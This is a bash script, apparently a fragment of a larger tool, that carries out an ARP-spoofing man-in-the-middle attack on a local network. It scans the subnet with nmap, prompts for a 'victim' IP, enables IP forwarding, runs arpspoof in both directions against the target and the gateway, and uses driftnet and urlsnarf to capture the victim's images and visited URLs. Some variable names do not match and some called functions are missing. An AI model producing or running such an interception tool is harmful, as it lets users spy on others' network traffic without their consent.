#!/bin/bash

function enablePacketFowarding {
  defaultInterface=$(sysctl -w net.ipv4.ip_forward=1)
  printf "\n Packet Forwarding Enabled \n\n";
}

function disablePacketFowarding {
  defaultInterface=$(sysctl -w net.ipv4.ip_forward=0)
  print "\n Packet Forwarding Disabled \n\n";
}

function getIPAddressesInNetworkMIM {

  printf "\n\nDetecting devices in the network... \n"
  ipAddressesMIM=( $(nmap -n -sn $userIPAddress/24 -oG - | awk '/Up$/{print $2}' | xargs) )
  #getMACAddressesInNetwork
}

function printIPAddressesInNetworkMIM {

  i=1
  for ip in "${ipAddressesMIM[@]}"
  do
    deviceName=$(getDeviceName "$ip")
    echo -e " ${RED}[$i] ${WHITE}"$ip"        [ "$deviceName" ]"
    ((i++))
  done

}

function selectedTarget {

  printf "${YELLOW}Available devices: \n${WHITE}"
  printIPAddressesInNetworkMIM


  printf "\n SELECT TARGET IP> \n"
  read -r victimIPAddress

  getDefaultGateway
  trafficSelectedIp
  enablePacketFowarding
  interceptPackages
  inverseInterceptPackages
  checkImages
  snifNetwork
}



function trafficSelectedIp {
  targetIPAddress=${ipAddressesMIM[ipSelectedMIM-1]}
  #victimMACAddress=${macAddresses[ipSelectedOption-1]}
  echo -e " ${YELLOW}Target IP: ${RED}"$vtargetIPAddress${WHITE}
  echo -e " ${YELLOW}Router IP: ${RED}"$defaultGateway${WHITE}

  echo " access from "$targetIPAddress"..."
  printf "\n\n\n"
  echo -e "${RED}         -> Press CTRL+C to STOP!${WHITE}"
  printf "\n\n"
}

function interceptPackages {
  printf " Intercepting pacakages\n\n"
  cmd="arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway

  $cmd &
}

function inverseInterceptPackages {
  cmd2="arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress

  $cmd2 &
}

function checkImages {
  cmd3=("driftnet -i wlan0")

  $cmd3 &
}

function snifNetwork {
  urlsnarf -i wlan0 > /dev/null
}

